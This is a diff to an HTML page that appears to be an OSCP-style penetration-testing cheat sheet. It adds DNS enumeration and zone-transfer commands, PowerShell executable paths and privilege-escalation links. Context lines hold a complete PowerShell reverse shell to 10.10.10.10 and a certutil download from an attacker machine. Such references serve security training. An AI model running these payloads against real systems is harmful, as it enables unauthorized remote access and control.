@@ -120,6 +120,14 @@ wpscan --url [URL] --enumerate u	(Enum users)
 <p><font size="3.5" color="black">* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
 
 <hr>
+<p><h3>DNS port discovered?</h3></p>
+<pre style="background-color:black;color:white;">
+whois domain-name-here.com			#WHOIS enumeration
+dig a domain-name-here.com @nameserver 		#Perform DNS IP Lookup
+dig mx domain-name-here.com @nameserver		#Perform MX Record Lookup
+dig axfr domain-name-here.com @nameserver	#Perform Zone Transfer (linux)
+nslookup -> set type=any -> ls -d blah.com	#Perform Zone Transfer (windows)
+</pre>
 <p><h3>Are there any NETBIOS, SMB, RPC ports discovered?</h3></p>
 <pre style="background-color:black;color:white;">
 enum4linux -a [IP_ADDRESS] (For more info - https://labs.portcullis.co.uk/tools/enum4linux/)
@@ -236,6 +244,18 @@ tcpdump -i tap0 host [IP_ADDRESS] tcp port 80 and not arp and not icmp -vv
 <p><font size="3.5" color="black">Payload list:</font></p>
 <pre style="background-color:black;color:white;">msfvenom -l</pre>
 <p><font size="3.5" color="black">Powershell</font></p>
+<pre style="background-color:black;color:white;">
+#PowerShell Executables File System Locations on 64-bit Windows:
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	#32-bit (x86) PowerShell executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe	#64-bit (x64) Powershell executable
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe	#32-bit (x86) Powershell ISE executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe	#64-bit (x64) Powershell ISE executable
+
+#PowerShell Executables File System Locations on 32-bit Windows
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe	#32-bit (x86) PowerShell executable
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe	#32-bit (x86) Powershell ISE executable
+</pre>
+<br>
 <pre style="background-color:black;color:white;">
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()	(reverse shell)
 (Optional: in cmd or "cmd /c powershell -c "[reverse_powershell]"")
@@ -381,6 +401,8 @@ certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\u
 <p><font size="3.5" color="black">Windows:</font></p>
 <p><font size="3.5" color="black">- http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</font></p>
 <p><font size="3.5" color="black">- http://www.fuzzysecurity.com/tutorials/16.html</font></p>
+<p><font size="3.5" color="black">- http://addaxsoft.com/wpecs/</font></p>
+<p><font size="3.5" color="black">- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</font></p>
 <p><font size="3.5" color="black">- ADS - https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/</font></p>
 <p><font size="3.5" color="black">Basic enumeration:</font></p>
 <pre style="background-color:black;color:white;">
